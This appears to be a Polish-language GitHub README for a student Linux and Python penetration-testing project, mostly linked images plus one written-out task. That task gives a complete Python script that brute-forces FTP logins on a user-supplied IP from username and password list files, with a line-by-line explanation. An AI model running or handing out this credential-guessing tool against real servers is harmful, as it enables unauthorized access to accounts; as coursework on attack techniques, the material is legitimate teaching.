![Python 3.0](https://github.com/Orinies/Projekt1---Linux-i-Python/blob/main/icon200.png)

# Projekt1---Linux-i-Python

## Repository for Projekt1 - Linux i Python

## Cele projektu:

![1](https://github.com/Orinies/Projekt1---Linux-i-Python/blob/main/z1.png)

![2](https://github.com/Orinies/Projekt1---Linux-i-Python/blob/main/z2.png)

![3](https://github.com/Orinies/Projekt1---Linux-i-Python/blob/main/z3.png)

![4](https://github.com/Orinies/Projekt1---Linux-i-Python/blob/main/z4.png)

![5](https://github.com/Orinies/Projekt1---Linux-i-Python/blob/main/z5.png)

![6](https://github.com/Orinies/Projekt1---Linux-i-Python/blob/main/z6.png)

![7](https://github.com/Orinies/Projekt1---Linux-i-Python/blob/main/z7.png)

![8](https://github.com/Orinies/Projekt1---Linux-i-Python/blob/main/z8.png)

![9](https://github.com/Orinies/Projekt1---Linux-i-Python/blob/main/z9.png)

6. Przeprowadzić atak brute-force na dowolną znalezioną usługę (nie musi się udać).
Na początku kodu importujemy bibliotekę ftplib, która definiuje m.in. klasę FTP.
import ftplib

Następnie pobieramy od użytkownika adres IP celu, dla którego będziemy łamać hasło. 
targethost = input("Podaj IP targetu: ")

Przypisuejmy bibliotekę do zmiennej
ftpserver = ftplib.FTP()

Ustalamy listę użytkowników i haseł do prób złamania hasła. Pliki powinny znajdować się w tej samej lokalizacji co plik Zad6.py
users = open("brute_users.txt")
passwords = open("passwords.txt")

Następnie zaczynamy pętlę, która sprawdza po kolei każde hasło, dla każdego użytkownika na liście podanej w linii 5 i 6
for user in users:
    user = user.replace("\n", "")
    passwords.seek(0)
    for password in passwords:
        password = password.replace("\n", "")
        print(f"Trying: {user}:{password}")
        try:
            ftpserver.connect(targethost, 21, timeout=5)
            ftpserver.login(user, password)
            print("zlamane")
            ftpserver.close()
        except Exception as e:
            print("Zle dane logowania")
            print(e)

Pętla pobiera userów po kolei z podanej listy
for user in users:

Przy każdym sprawdzeniu należy zamienić końcowy znak nowej linii na brak znaku, co jest robione w poniższej linii:
user = user.replace("\n", "")

Lista z hasłami powinna być ustawiana na jej początek po sprawdzeniu haseł dla każdego z użytkowników
passwords.seek(0)


Pętla zagnieżdżona w pierwszym „forze” pobiera hasła z listy haseł oraz podmienia znak nowej linii tak samo jak w przypadku użytkowników
for password in passwords:
	password = password.replace("\n", "")

Program podaje dane, dla których podejmowana jest próba złamania hasła
print(f"Trying: {user}:{password}")

Następnie podejmowana jest próba połączenia
ftpserver.connect(targethost, 21, timeout=5)
Gdzie:
	targethost – podany przez użytkownika adres IP celu
	21 – port
	timeout – czas oczekiwania na odpowiedź
Po udanej próbie połączenia, podawane są dane logowania z podanych wcześniej list
ftpserver.login(user, password)

Gdy próba zalogowania się powiedzie, wypisywana jest informacja i połączenie jest zamykane
print("zlamane")
ftpserver.close()

Jeżeli próba się nie powiedzie, zwracany jest błąd pod zmienną e
except Exception as e:
    print("Zle dane logowania")
    print(e)


## Technologia: 

Jezyki Linux & Python

PyCharm lub legitnie:
- Python - sudo + nazwa pliku

## Przykład użycia

Ustalanie własnego adresu IP oraz maski podsieci.

Wykonywanie podstawowych czynności testów penetracyjnych.
